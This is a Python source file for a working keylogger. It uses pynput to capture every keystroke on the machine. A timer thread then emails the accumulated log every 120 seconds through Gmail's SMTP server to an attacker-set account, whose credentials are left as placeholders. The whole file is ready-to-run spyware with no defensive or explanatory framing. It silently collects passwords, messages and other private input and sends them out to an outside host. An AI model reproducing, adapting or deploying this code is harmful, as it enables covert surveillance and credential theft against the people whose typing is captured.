#!/usr/bin/python3.8

import smtplib
import threading

from pynput import *


class Keylogger:
    def __init__(self, interval, uname, passwd):
        self.log = "Key logger started"
        self.interval = interval
        self.uname = uname
        self.passwd = passwd

    def append_log(self, string):
        self.log = self.log + string

    def send_mail(self, uname, passwd, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(uname, passwd)
        server.sendmail(uname, uname, message)
        server.quit()

    def process_key_press(self, key):
        try:
            current_key = str(key.char)

        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_log(current_key)

    def report(self):
        self.send_mail(self.uname, self.passwd, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


key = Keylogger(interval=120, uname="Your Username", passwd="Your Password")
key.start()
